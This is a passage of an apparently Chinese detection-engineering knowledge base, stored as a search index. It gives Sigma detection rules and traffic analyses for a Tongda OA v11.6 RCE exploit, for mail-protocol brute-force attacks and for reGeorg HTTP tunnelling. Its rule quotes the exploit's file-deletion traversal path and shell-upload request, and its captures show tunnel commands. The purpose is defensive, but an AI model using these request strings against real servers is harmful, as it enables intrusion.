<p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u901a\u8fbeOA\uff08Office Anywhere\u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf\uff09\u662f\u7531\u5317\u4eac\u901a\u8fbe\u4fe1\u79d1\u79d1\u6280\u6709\u9650\u516c\u53f8\u81ea\u4e3b\u7814\u53d1\u7684\u534f\u540c\u529e\u516c\u81ea\u52a8\u5316\u7cfb\u7edf\uff0c\u5305\u62ec\u6d41\u7a0b\u5ba1\u6279\u3001\u884c\u653f\u529e\u516c\u3001\u65e5\u5e38\u4e8b\u52a1\u3001\u6570\u636e\u7edf\u8ba1\u5206\u6790\u3001\u5373\u65f6\u901a\u8baf\u3001\u79fb\u52a8\u529e\u516c\u7b49\u3002</p> <p>\u8be5exp\u4f1a\u5220\u9664uth.inc.php\u6587\u4ef6\u5bfc\u81f4OA\u7cfb\u7edf\u7cfb\u7edf\u5f02\u5e38\u3002</p> <p>\u76ee\u524d\u5df2\u77e5\u53d7\u5f71\u54cd\u7248\u672c\uff1aV11.6</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP.log</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6f0f\u6d1e\u590d\u73b0\u5efa\u8bae\u53c2\u8003\u4ee5\u4e0b\u6587\u7ae0</p> <p>https://www.cnblogs.com/L0ading/p/13529013.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u53ef\u81ea\u884c\u672c\u5730\u6d4b\u8bd5\u6293\u53d6\u6d41\u91cf </p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#sigma","title":"Sigma\u89c4\u5219","text":"<p>\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002</p> <pre><code>title: \u901a\u8fbeOA v11.6 RCE\ndescription: \u68c0\u6d4b\u901a\u8fbeOA v11.6 RCE\u6f0f\u6d1e\nauthor: 12306Bro\ndate: 2020/08/19\nstatus: experimental\nreferences:\n    - https://www.cnblogs.com/L0ading/p/13529013.html\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        c-uri:\n            - '//module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php' #\u54cd\u5e94\u5305\u72b6\u6001\u7801\u4e3a200\n            - '//inc/auth.inc.php' #\u54cd\u5e94\u5305\u72b6\u6001\u7801\u4e3a404\uff0c\u610f\u5473\u7740\u5220\u9664\u6210\u529f\n        http.request.method: 'GET' #\u8bf7\u6c42\u65b9\u6cd5\u4e3aGET\n        User-Agent: 'python-requests/*' #PY\u811a\u672c\u81ea\u5e26\n    selection2:\n        c-uri: \n            - '//general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.%3C%3E./.%3C%3E./.%3C%3E./' #\u54cd\u5e94\u5305\u72b6\u6001\u7801\u4e3a200\n        http.request.method: 'POST' #\u8bf7\u6c42\u65b9\u6cd5\u4e3aPOST\n        User-Agent: 'python-requests/*' #PY\u811a\u672c\u81ea\u5e26\n        Content-Disposition: form-data; name=\"FILE1\"; filename=\"*.php\" #\u5199\u5165shell\u6587\u4ef6\n    condition: selection1 or selection2 #\u5f53\u6761\u4ef61\u548c\u6761\u4ef62\u51fa\u73b0\u4efb\u610f\u4e00\u4e2a\u65f6\uff0c\u610f\u5473\u7740\u4f60\u53ef\u80fd\u6b63\u5728\u906d\u53d7\u63a2\u6d4b\u6027\u653b\u51fb\uff0c\u5982\u679c\u5728\u77ed\u65f6\u95f4\u5185\u51fa\u73b0\u4e86\u6761\u4ef61\u540e\uff0c\u51fa\u73b0\u4e86\u6761\u4ef62\uff0c\u5e76\u4e14\u8fd4\u56de\u5305\u72b6\u6001\u7801\u4e3a200\uff0c\u610f\u5473\u7740\u653b\u51fb\u6b63\u5728\u53d1\u751f\uff0c\u53ef\u80fd\u5165\u4fb5\u6210\u529f\u3002\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre> <p>\u6b64\u89c4\u5219\u68c0\u6d4b\u9897\u7c92\u5ea6\u8f83\u7ec6\uff0c\u5efa\u8bae\u6839\u636e\u6570\u636e\u6e90\u7b49\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u8c03\u6574\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>\u6700\u65b0\u901a\u8fbeOA11.6\u7248\u672c\u524d\u53f0getshell\u6f0f\u6d1e\u590d\u73b0</p> <p>https://www.cnblogs.com/L0ading/p/13529013.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","title":"T1190-\u90ae\u7bb1\u66b4\u529b\u7834\u89e3\u653b\u51fb\u6d41\u91cf\u5206\u6790","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c \u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u672c\u6587\u6848\u4f8b\u4e3b\u8981\u53c2\u8003\u3001\u6458\u5f55\u81ea\u300a\u73b0\u573a\u53d6\u8bc1\u4e4b\u6d41\u91cf\u5206\u6790\u603b\u7ed3\u300b\uff0c\u4e0a\u94fe\u63a5</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u5168\u6d41\u91cf</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0\uff0c\u67e5\u770b\u6d4b\u8bd5\u6587\u6863\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#pop3","title":"POP3\u534f\u8bae","text":"<p>\u534f\u8bae\u8ba4\u8bc1\u8fc7\u7a0b</p> <pre><code>CAPA                               //\u7528\u4e8e\u53d6\u5f97\u6b64\u670d\u52a1\u5668\u7684\u529f\u80fd\u9009\u9879\u6e05\u5355\n+OK Capability list follows\nTOP\nUSER\nPIPELINING\nEXPIRE NEVER\nUIDL\n+OK  Mail Server POP3 ready\nuser a1@a.com ---------------------\u8f93\u5165\u7528\u6237\u540d, username \u4e3a\u5177\u4f53\u7684\u7528\u6237\u540d\n+OK -------------------------------\u6267\u884c\u547d\u4ee4\u6210\u529f\npass q1q1q1q1 ---------------------\u8f93\u5165\u7528\u6237\u5bc6\u7801\uff0cpassword \u4e3a\u5177\u4f53\u7684\u5bc6\u7801\uff0c\u8fd9\u91cc\u8981\u6ce8\u610f\uff0c\u5f53\u5bc6\u7801\u8f93\u5165\u9519\u8bef\u540e\u8981\u91cd\u65b0user username\u540e\u518d\u8fd0\u884c\u6b64\u547d\u4ee4\uff0c\u5426\u5219\u63d0\u793a\u547d\u4ee4\u65e0\u6548\n+OK 2 messages ---------------------\u5bc6\u7801\u8ba4\u8bc1\u901a\u8fc7\n(-ERR authorization failed ---------\u5bc6\u7801\u8ba4\u8bc1\u5931\u8d25)\n(+OK User successfully logged on. --\u8ba4\u8bc1\u6210\u529f)\nstat -------------------------------\u90ae\u7bb1\u72b6\u6001\n+OK 2 6415 -------------------------2 \u4e3a\u8be5\u4fe1\u7bb1\u603b\u90ae\u4ef6\u6570\uff0c6415 \u4e3a\u603b\u5b57\u8282\u6570\nlist -------------------------------\u5217\u51fa\u6bcf\u5c01\u90ae\u4ef6\u7684\u5b57\u8282\u6570\n+OK --------------------------------\u6267\u884c\u547d\u4ee4\u6210\u529f\uff0c\u5f00\u59cb\u663e\u793a\uff0c\u5de6\u8fb9\u4e3a\u90ae\u4ef6\u7684\u5e8f\u53f7\uff0c\u53f3\u8fb9\u4e3a\u8be5\u90ae\u4ef6\u7684\u5927\u5c0f\n1 537 ------------------------------\u7b2c 1 \u5c01\u90ae\u4ef6\uff0c\u5927\u5c0f\u4e3a 537 \u5b57\u8282\n2 5878 -----------------------------\u7b2c 2 \u5c01\u90ae\u4ef6\uff0c\u5927\u5c0f\u4e3a 5878 \u5b57\u8282\n+OK Microsoft Exchange Server 2003 POP3 .......... 6.5.6944.0 ..........\n</code></pre> <p>\u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a</p> <p>\u653b\u51fb\u8005\u4e0d\u65ad\u8f93\u5165\u7528\u6237\u540djufeng001\uff0c\u4e0d\u540c\u7684\u5bc6\u7801\u8fdb\u884c\u5c1d\u8bd5\uff0c\u670d\u52a1\u5668\u4e5f\u5927\u91cf\u62a5\u9519\uff1a-ERR Logon failure: unknown user name or bad password\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#smtp","title":"SMTP\u534f\u8bae","text":"<p>\u534f\u8bae\u8ba4\u8bc1\u8fc7\u7a0b\uff1a</p> <pre><code>220 a-ba21a05129e24.test.org Microsoft ESMTP MAIL Service, Version: 6.0.3790.3959 ready at  Thu, 6 Aug 2015 11:10:17 +0800  //\u670d\u52a1\u5c31\u7eea\nEHLO Mr.RightPC                                         //\u4e3b\u673a\u540d\n250-a-ba21a05129e24.test.org Hello [192.1.14.228]\n\u2026\u2026\n250 OK\nAUTH LOGIN                // \u8ba4\u8bc1\u5f00\u59cb\n334 VXNlcm5hbWU6          // Username:\ncGFzc0AxMjM=              // \u8f93\u5165\u7528\u6237\u540d\u7684base64\u7f16\u7801\n334 UGFzc3dvcmQ6          // Password:\nMXFhekBXU1g=              // \u8f93\u5165\u5bc6\u7801\u7684base64\u7f16\u7801\n235 2.7.0 Authentication successful.    //\u8ba4\u8bc1\u6210\u529f\n</code></pre> <p>\u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a</p> <p>\u653b\u51fb\u8005\u4e0d\u65ad\u8f93\u5165\u7528\u6237\u540djufeng001\uff0c\u4e0d\u540c\u7684\u5bc6\u7801\u8fdb\u884c\u5c1d\u8bd5\uff0c\u670d\u52a1\u5668\u4e5f\u5927\u91cf\u62a5\u9519\uff1a535 5.7.3 Authentication unsuccessful\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#imap","title":"IMAP\u534f\u8bae","text":"<p>\u534f\u8bae\u8ba4\u8bc1\u8fc7\u7a0b\uff1a</p> <pre><code>bf8p CAPABILITY\n* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN\nbf8p OK CAPABILITY completed.\ns3yg LOGIN \"administrator\" \"1qaz@WSX\"        //\u8f93\u5165\u7528\u6237\u540d:administrator\uff0c\u5bc6\u7801:1qaz@WSX\ns3yg OK LOGIN completed.                    //\u8ba4\u8bc1\u6210\u529f\n</code></pre> <p>\u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a</p> <p>IMAP\u7206\u7834\u4f1a\u4e0d\u65ad\u91cd\u590dLOGIN \"\u7528\u6237\u540d\" \"\u5bc6\u7801\"\uff0c\u4ee5\u53ca\u767b\u5f55\u5931\u8d25\u7684\u62a5\u9519\uff1aNO Logon failure: unknown user name or bad password\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#http","title":"HTTP\u534f\u8bae","text":"<p>HTTP\u767b\u5f55\u9875\u9762\u770b\u662f\u5426\u5b58\u5728302\u9875\u9762\u8df3\u8f6c\u5224\u65ad\u4e3a\u767b\u5f55\u6210\u529f\u3002</p> <pre><code>Referer: http://192.1.14.199:8080/login.html     //\u767b\u5f55\u5730\u5740\nuname=admin&amp;upass=1qaz%40WSXHTTP/1.1 200 OK\n\u2026\n&lt;script&gt;alert('OK')&lt;/script&gt;\n//\u8f93\u5165\u7528\u6237\u540dadmin\uff0c\u5bc6\u78011qaz%40WSX\uff0cWeb\u670d\u52a1\u5668\u8fd4\u56deHTTP/1.1 200\u548c\u5f39\u51fa\u5bf9\u8bdd\u6846\u201cOK\u201d\u8868\u793a\u8ba4\u8bc1\u6210\u529f\u3002\n</code></pre> <p>\u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a</p> <p>\u77ed\u65f6\u95f4\u5185\u51fa\u73b0\u5927\u91cf\u767b\u5f55\u9875\u9762\u7684\u8bf7\u6c42\u5305\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#https","title":"HTTPS\u534f\u8bae","text":"<p>HTTPS\u534f\u8bae\u4e3a\u52a0\u5bc6\u534f\u8bae\uff0c\u4ece\u6570\u636e\u5f88\u96be\u5224\u65ad\u8ba4\u8bc1\u662f\u5426\u6210\u529f\uff0c\u53ea\u80fd\u6839\u636e\u6570\u636e\u5934\u90e8\u7ed3\u5408\u793e\u4f1a\u5de5\u7a0b\u5b66\u624d\u80fd\u5224\u65ad\u3002\u5982\u8ba4\u8bc1\u540e\u6709\u65e0\u67e5\u770b\u7f51\u9875\u3001\u90ae\u4ef6\u7684\u6b65\u9aa4\uff0c\u5982\u6709\uff0c\u5c31\u4f1a\u4ea7\u751f\u52a0\u5bc6\u6570\u636e\u3002</p> <p>\u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a</p> <p>\u7206\u7834\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u65ad\u51fa\u73b0\u8ba4\u8bc1\u8fc7\u7a0b\uff1a\u201cClient Hello\u201d\u3001\u201cServer Hello\u201d\u7b49\uff0c\u5e76\u672a\u51fa\u73b0\u767b\u5f55\u6210\u529f\u540e\u64cd\u4f5c\u7684\u5927\u91cf\u52a0\u5bc6\u6570\u636e\u3002\u5728\u4e0d\u52302\u79d2\u7684\u65f6\u95f4\u5c31\u51fa\u73b016\u6b21\u8ba4\u8bc1\uff0c\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u4e3a\u66b4\u529b\u7834\u89e3\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>\u73b0\u573a\u53d6\u8bc1\u4e4b\u6d41\u91cf\u5206\u6790\u603b\u7ed3</p> <p>https://my.oschina.net/u/4395026/blog/3783867</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/","title":"T1505-003-Regeorg-HTTP\u96a7\u9053\u68c0\u6d4b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5e26\u6709Web Shell\u7684\u540e\u95e8Web\u670d\u52a1\u5668\u7528\u4e8e\u5efa\u7acb\u5bf9\u7cfb\u7edf\u7684\u6301\u4e45\u8bbf\u95ee\u3002Web Shell\u662f\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\u7684Web\u811a\u672c\uff0c\u4ee5\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u8fdb\u5165\u7f51\u7edc\u7684\u7f51\u5173\u3002Web shell\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6258\u7ba1Web\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u4e0a\u63d0\u4f9b\u4e00\u7ec4\u8981\u6267\u884c\u7684\u529f\u80fd\u6216\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u3002</p> <p>\u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWeb Shell\u53ef\u80fd\u8fd8\u5177\u6709\u7528\u4e8e\u4e0eWeb\u670d\u52a1\u5668\u5bf9\u8bdd\u7684\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f(\u5982\u83dc\u5200\u3001\u51b0\u874e\u3001\u54e5\u65af\u62c9\u7b49)</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#regeorg","title":"ReGeorg\u7b80\u4ecb","text":"<p>reGeorg\u662freDuh\u7684\u7ee7\u627f\u8005\uff0c\u5229\u7528\u4e86\u4f1a\u8bdd\u5c42\u7684socks5\u534f\u8bae\uff0c\u6548\u7387\u66f4\u9ad8\u7ed3\u5408Proxifier\u4f7f\u7528\uff1bProxifier\u662f\u4e00\u6b3e\u529f\u80fd\u975e\u5e38\u5f3a\u5927\u7684socks5\u5ba2\u6237\u7aef\uff0c\u53ef\u4ee5\u8ba9\u4e0d\u652f\u6301\u901a\u8fc7\u4ee3\u7406\u670d\u52a1\u5668\u5de5\u4f5c\u7684\u7f51\u7edc\u7a0b\u5e8f\u80fd\u901a\u8fc7HTTPS\u6216SOCKS\u4ee3\u7406\u6216\u4ee3\u7406\u94fe\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>reGeorg\u642d\u5efaHTTP\u96a7\u9053\u548c\u6d41\u91cf\u5206\u6790</p> <p>https://cloud.tencent.com/developer/article/1779195</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP_log</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u53c2\u8003\u6d4b\u8bd5\u6848\u4f8b\u6587\u7ae0\u94fe\u63a5</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>kali</p> <p>\u5728kali\u4e0a\u6293\u5305\uff0c\u7136\u540e\u8bbf\u95ee\u5185\u7f51\uff0ctcpdump\u6293\u5305\uff0c\u5206\u6790\u6d41\u91cf</p> <p>tcpdump -ieth0 -wkali.pcap \u7136\u540e\u6253\u5f00wireshark\u8ffd\u8e2atcp\u6d41\uff0c\u770b\u6d41\u91cf</p> <pre><code>...............P.........PGET /login.php HTTP/1.1\nHost: 172.17.0.2\nUser-Agent: curl/7.68.0\nAccept: */*\nHTTP/1.1 200 OK\nDate: Thu, 17 Dec 2020 16:39:09 GMT\nServer: Apache/2.4.7 (Ubuntu)\nX-Powered-By: PHP/5.5.9-1ubuntu4.25\nSet-Cookie: PHPSESSID=7mhcg05sbeerpgjvthqad6r7t6; path=/\nExpires: Tue, 23 Jun 2009 12:00:00 GMT\nCache-Control: no-cache, must-revalidate\nPragma: no-cache\nSet-Cookie: PHPSESSID=7mhcg05sbeerpgjvthqad6r7t6; path=/; httponly\nSet-Cookie: security=impossible; httponly\nVary: Accept-Encoding\nContent-Length: 1567\nContent-Type: text/html;charset=utf-8\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;\n</code></pre> <p>serverA</p> <p>\u5728serverA\u4e0a\u6293\u5305\u7b2c\u4e00\u4e2a\u6d41\u53ef\u4ee5\u770b\u5230\u670d\u52a1\u5668A\u4f5c\u4e3a\u8df3\u677f\uff0c\u8868\u660e\u670d\u52a1\u5668\u4e0e\u54ea\u53f0\u5185\u7f51\u4e3b\u673a\u7684\u54ea\u4e2a\u7aef\u53e3\u8fde\u63a5cmd=connecttarget=172.17.0.2 \u76ee\u6807\u5185\u7f51ipport=80 \u7aef\u53e3\u4e3a80</p> <pre><code>POST http://182.x.x.x:8080/tunnel.jsp?\ncmd=connect&amp;target=172.17.0.2&amp;port=80 HTTP/1.1\nHost: 182.x.x.x:8080\nAccept-Encoding: identity\nContent-Length: 0\nX-CMD: CONNECT\nX-PORT: 80\nX-TARGET: 172.17.0.2\nUser-Agent: python-urllib3/1.26.2\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nSet-Cookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly\nX-STATUS: OK\nContent-Type: text/html\nContent-Length: 0\nDate: Thu, 17 Dec 2020 16:44:45 GMT\n</code></pre> <p>\u4e0b\u4e00\u6761\u6d41cmd=read,\u4ee3\u8868\u662f\u53bb\u8bbf\u95ee\u5185\u7f51\u7684\u5185\u5bb9</p> <p>Accept-Encoding: identity\u8bf7\u6c42\u7684HTTP\u5934\u901a\u544a\u5176\u5185\u5bb9\u7f16\u7801\uff0c\u53ea\u8981\u6ca1\u6709\u88ab\u660e\u786e\u7981\u6b62</p> <p>\u670d\u52a1\u5668\u5c31\u4e0d\u80fd\u53d1\u56de406 Not Acceptable\u9519\u8bef</p> <p>\u54cd\u5e94\u5305\u5934\uff1aTransfer-Encoding: chunked\u4ee3\u8868\u662f\u5206\u5757\u4f20\u8f93</p> <pre><code>POST /tunnel.jsp?cmd=read HTTP/1.1\nHost: 182.x.x.x:8080\nAccept-Encoding: identity\nContent-Length: 0\nX-CMD: READ\nCookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly\nConnection: Keep-Alive\nUser-Agent: python-urllib3/1.26.2\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nX-STATUS: 